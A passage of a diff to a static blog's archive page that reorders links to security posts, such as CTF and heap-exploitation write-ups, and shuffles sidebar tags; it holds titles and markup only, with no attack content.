-            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/42373/">casw-2018</a>
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
@@ -1723,12 +1855,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
@@ -1853,12 +1985,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
@@ -1932,13 +2064,13 @@
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
-    
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
     
-        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
+        <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
+    
+        <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
